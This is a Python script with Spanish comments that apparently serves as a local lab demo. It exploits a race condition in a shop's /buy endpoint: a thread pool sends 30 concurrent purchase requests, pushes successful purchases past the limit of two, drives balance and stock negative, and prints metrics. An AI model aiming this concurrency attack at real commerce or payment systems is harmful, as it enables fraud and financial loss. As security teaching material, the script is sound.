#/usr/bin/python3

import argparse
import signal
import sys
import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

BASE_URL = "http://127.0.0.1:8000"

# True = ataque con hilos (paralelo)
# False = ataque secuencial (un request a la vez)
USAR_HILOS = True

TOTAL_REQUESTS = 30
DEFAULT_HILOS = 10
HILOS_SIMULTANEOS = DEFAULT_HILOS

compras_exitosas = 0
compras_fallidas = 0
tiempos_respuesta = []
lock_contadores = threading.Lock()  # protege los contadores del script

def comprar(producto_id):
    global compras_exitosas, compras_fallidas

    url = f"{BASE_URL}/buy/{producto_id}"
    inicio = time.time()

    try:
        r = requests.get(url, timeout=30)
        latencia = (time.time() - inicio) * 1000  
        with lock_contadores:
            tiempos_respuesta.append(latencia)
            if "Compra realizada" in r.text:
                compras_exitosas += 1
                print(f"  [+] EXITOSA  (total: {compras_exitosas}) — {latencia:.0f}ms")
            else:
                compras_fallidas += 1
                print(f"  [!] Rechazada (total: {compras_fallidas}) — {latencia:.0f}ms")

    except Exception as e:
        print(f"  [x] Error: {e}")

def reset():
    requests.post(f"{BASE_URL}/reset")
    print("[*] Estado reseteado\n")

def ver_estado():
    r = requests.get(f"{BASE_URL}/estado")
    return r.json()

def imprimir_metricas(tiempo_total, modo):
    saldo_final = ver_estado()['usuario']['saldo']
    stock_final = ver_estado()['productos'][0]['stock']

    compras_indebidas = max(0, compras_exitosas - 2)
    perdida_simulada  = compras_indebidas * 5000

    latencia_promedio = sum(tiempos_respuesta) / len(tiempos_respuesta) if tiempos_respuesta else 0
    latencia_min      = min(tiempos_respuesta) if tiempos_respuesta else 0
    latencia_max      = max(tiempos_respuesta) if tiempos_respuesta else 0
    throughput        = TOTAL_REQUESTS / tiempo_total

    print("\n" + "=" * 60)
    print(f"MÉTRICAS — MODO {'PARALELO (hilos)' if modo else 'SECUENCIAL'}")
    print("=" * 60)

    print("\n── Resultados de compra ──")
    print(f"  Requests lanzadas:     {TOTAL_REQUESTS}")
    print(f"  Compras exitosas:      {compras_exitosas}  (máximo legítimo: 2)")
    print(f"  Compras rechazadas:    {compras_fallidas}")
    print(f"  Compras indebidas:     {compras_indebidas}")
    print(f"  Saldo final:           ${saldo_final}{'  [!]  NEGATIVO' if saldo_final < 0 else ''}")
    print(f"  Stock final:           {stock_final}{'  [!]  NEGATIVO' if stock_final < 0 else ''}")
    print(f"  Pérdida simulada:      ${perdida_simulada}")

    print("\n── Métricas de rendimiento ──")
    print(f"  Tiempo total:          {tiempo_total:.2f}s")
    print(f"  Throughput:            {throughput:.1f} req/s")
    print(f"  Latencia promedio:     {latencia_promedio:.0f}ms")
    print(f"  Latencia mínima:       {latencia_min:.0f}ms")
    print(f"  Latencia máxima:       {latencia_max:.0f}ms")

    print("\n── Diagnóstico ──")
    if compras_exitosas > 2:
        print(f"  [+]  RACE CONDITION EXPLOTADA")
        print(f"      {compras_indebidas} compras extra pasaron la validación")
        if saldo_final < 0:
            print(f"      El saldo quedó NEGATIVO: ${saldo_final}")
    else:
        print(f"  [!] Sin race condition — la protección funcionó")

    print("=" * 60)

def simular_paralelo():
    print(f"[*] Lanzando {TOTAL_REQUESTS} requests en paralelo ({HILOS_SIMULTANEOS} hilos simultáneos)...\n")

    inicio = time.time()

    with ThreadPoolExecutor(max_workers=HILOS_SIMULTANEOS) as executor:
        futuros = [executor.submit(comprar, 1) for _ in range(TOTAL_REQUESTS)]
        for f in futuros:
            f.result()

    tiempo_total = time.time() - inicio
    return tiempo_total

def simular_secuencial():
    print(f"[*] Lanzando {TOTAL_REQUESTS} requests de forma secuencial (una por una)...\n")

    inicio = time.time()

    for _ in range(TOTAL_REQUESTS):
        comprar(1)

    tiempo_total = time.time() - inicio
    return tiempo_total

def simular_race_condition():
    global compras_exitosas, compras_fallidas, tiempos_respuesta
    compras_exitosas  = 0
    compras_fallidas  = 0
    tiempos_respuesta = []

    reset()

    estado = ver_estado()
    print("=" * 60)
    print("ESTADO INICIAL")
    print(f"  Saldo:               ${estado['usuario']['saldo']}")
    print(f"  Stock Rines Honda:    {estado['productos'][0]['stock']}")
    print(f"  Precio unitario:      $5000")
    print(f"  Modo:                 {'PARALELO — con hilos' if USAR_HILOS else 'SECUENCIAL — sin hilos'}")
    print("=" * 60 + "\n")

    if USAR_HILOS:
        tiempo_total = simular_paralelo()
    else:
        tiempo_total = simular_secuencial()

    imprimir_metricas(tiempo_total, USAR_HILOS)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simular race condition en compras")
    parser.add_argument(
        "--hilos",
        type=int,
        default=DEFAULT_HILOS,
        help=f"Cantidad de hilos simultáneos (default: {DEFAULT_HILOS})",
    )
    args = parser.parse_args()
    if args.hilos < 1:
        print("[!] La cantidad de hilos debe ser >= 1\nUsando valor por defecto...")
        HILOS_SIMULTANEOS = DEFAULT_HILOS
    else:   
        HILOS_SIMULTANEOS = args.hilos

    simular_race_condition()
